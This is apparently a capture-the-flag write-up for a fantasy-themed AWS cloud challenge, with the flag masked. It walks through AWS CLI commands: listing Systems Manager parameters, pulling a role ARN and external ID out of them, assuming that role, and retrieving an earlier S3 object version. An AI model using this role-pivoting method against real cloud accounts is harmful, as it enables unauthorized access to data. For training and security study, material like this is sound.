# False Ferry
|Category |Difficulty|
|:-------:|:--------:|
|  Cloud  |   Easy   |

**Skills learned:**
* AWS CLI

## Description
Lysa Harrowmere reaches the lower city ferry piers while Stormbound soldiers wait for the morning boat. They are supposed to cross the river and guard the east road before Vaultrune's next patrol moves through. The route board says the boat goes to the east road landing, but the crew roster sends it to a dock controlled by Vaultrune. If Lysa warns the soldiers openly, Vaultrune's men can claim she started a fight at the pier. If she confronts the ferry master, his guards can tear down the roster and post the correct one. Lysa has one job: find the earlier crossing list, prove who changed the dock, and get the soldiers onto the right boat before Vaultrune cuts the road.

You hold Stormbound Coalition ferry clerk access. Crossing batch metadata lives in Systems Manager under `/ferry/crossing/`. Catalog the namespace before you read any parameter value.

## CLI Setup
1. Install AWS CLI if you have not already. Instructions can be found [here](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html).
2. Start the challenge's Docker container and use either `aws configure` or the provided `export` commands to use your assigned credentials.
3. Use the command `aws sts get-caller-identity` to confirm you have successfully configured the `coalition-ferry-clerk` user.

## Initial Steps
Since we have already been told that ferry crossing metadata lives in **Systems Manager**, we can start looking at the systems manager CLI [command reference](https://docs.aws.amazon.com/cli/latest/reference/ssm/).

The command we should use first to 'catalog the namespace' appears to be `describe-parameters`. I started here using: `aws ssm describe-parameters \
    --parameter-filters "Key=Name,Option=BeginsWith,Values=/ferry/crossing/"`.

The output gives us the full list of parameters with the following structure:
```
    {
        "Name": "/ferry/crossing/CROSSING-CLOSED-5E22",
        "Type": "String",
        "LastModifiedDate": "2026-07-25T15:55:37.358000-04:00",
        "Version": 1,
        "DataType": "text"
    },
```

## Further Investigation
After describing all parameters from the `/ferry/crossing/` namespace, we can now begin to read each parameter individually, via `aws ssm get-parameter`.

Looking closer at the output of each `get-parameter` fetch, we can find the specific manifest we need to investigate as well as **hidden user roles**.

The manifest we need to look into can be found in the `CROSSING-DRAFT-8D40` crossing:
```
 aws ssm get-parameter --name "/ferry/crossing/CROSSING-DRAFT-8D40" --with-decryption           
{
    "Parameter": {
        "Name": "/ferry/crossing/CROSSING-DRAFT-8D40",
        "Type": "String",
        "Value": "{\n  \"crossing_id\": \"CROSSING-DRAFT-8D40\",\n  \"status\": \"DRAFT\",\n  \"issuer\": \"third-party-archive\",\n  \"scanner_external_id\": \"sb-ferry-audit-2026-00987\",\n  \"manifest_bucket\": \"ferry-crossing-manifest\",\n  \"manifest_object_key\": \"manifests/morning-crossing-order-draft.txt\",\n  \"record_type\": \"crossing_manifest\"\n}",
        "Version": 1,
        "LastModifiedDate": "2026-07-25T15:55:37.430000-04:00",
        "ARN": "arn:aws:ssm:us-east-1:584729103648:parameter/ferry/crossing/CROSSING-DRAFT-8D40",
        "DataType": "text"
    }
}
```

The manifest name is **manifests/morning-crossing-order-draft.txt**. We can assume this may hold 'the earlier crossing list' referenced earlier. 

By extracting the hidden user role data from within the list of parameters, we can try to **assume** the new role:
```
aws sts assume-role \
  --role-arn "arn:aws:iam::584729103648:role/ferry-crossing-scanner" \
  --role-session-name "FerryAuditSession" \
  --external-id "ferry-crossing-scanner-7a3f" \
  --region us-east-1
```

This can be found in the `CROSSING-7A3F` parameter. Using the command `aws sts assume-role`, we will be given the full AccessKeyd, SecretAccessKey and SessionToken for this user role. Pivot to this role using **export** commands with these new secrets.

With our new **ferry-crossing-scanner** role, we can further dig into the `morning-crossing-order.txt` manifest and the **manifest_bucket** it's stored in. Now we need the s3api [command reference](https://docs.aws.amazon.com/cli/latest/reference/s3api/).

We can use the command `list-object-versions`, providing the **ferry-crossing-manifest** bucket and search prefix of **manifests/morning-crossing-order.txt** to find previous versions of the morning crossing manifest.

```
aws s3api list-object-versions \
  --bucket ferry-crossing-manifest \
  --prefix manifests/morning-crossing-order.txt \
  --region us-east-1
{
    "Versions": [
        {
            "ETag": "\"9568150b6166dad6937c9d878f9a0481\"",
            "Size": 129,
            "StorageClass": "STANDARD",
            "Key": "manifests/morning-crossing-order.txt",
            "VersionId": "c1dbf6ad-542d-4449-8314-1b259b4d6c30",
            "IsLatest": true,
            "LastModified": "2026-07-25T19:55:37+00:00"
        },
        {
            "ETag": "\"eace9fa6bc64353a0e4e8b4198152d2e\"",
            "Size": 99,
            "StorageClass": "STANDARD",
            "Key": "manifests/morning-crossing-order.txt",
            "VersionId": "c1272063-3b1c-4181-b508-45b20471852d",
            "IsLatest": false,
            "LastModified": "2026-07-25T19:55:37+00:00"
        },
        {
            "ETag": "\"3e1a67eae995a9cf08edeaa6e3777395\"",
            "Size": 157,
            "StorageClass": "STANDARD",
            "Key": "manifests/morning-crossing-order.txt",
            "VersionId": "64877783-205a-435a-9229-b442b9d85e20",
            "IsLatest": false,
            "LastModified": "2026-07-25T19:55:37+00:00"
        }
    ],
    "RequestCharged": null,
    "Prefix": "manifests/morning-crossing-order.txt"
}
```

Now that we have a few different versions of the `morning-crossing-order.txt` file, we have to read each one of them to find the flag. Using the s3api command `get-object` does that for us.

```
aws s3api get-object \
  --bucket ferry-crossing-manifest \
  --key manifests/morning-crossing-order.txt \
  --version-id "64877783-205a-435a-9229-b442b9d85e20" \
  earlier_manifest.txt \
  --region us-east-1
{
    "AcceptRanges": "bytes",
    "LastModified": "2026-07-25T19:55:37+00:00",
    "ContentLength": 157,
    "ETag": "\"3e1a67eae995a9cf08edeaa6e3777395\"",
    "ChecksumCRC32": "lnZDsA==",
    "VersionId": "64877783-205a-435a-9229-b442b9d85e20",
    "ContentType": "text/plain; charset=utf-8",
    "Metadata": {},
    "StorageClass": "STANDARD"
}
```

The above command gets the specific version of **manifests/morning-crossing-order.txt** and saves it to our local machine in the file **earlier_manifest.txt**. Now we can read the contents of this file with `cat earlier_manifest.txt`.

```
cat earlier_manifest.txt             
CROSSING RELEASE RECORD
Batch: CROSSING-7A3F
Authorized by: Stormbound Coalition Ferry Office
HTB{ferry_crossing.......}
```

## Flag
**Flag: HTB{ferry_crossing_\*\*\*\*_\*\*\*\*_\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*}**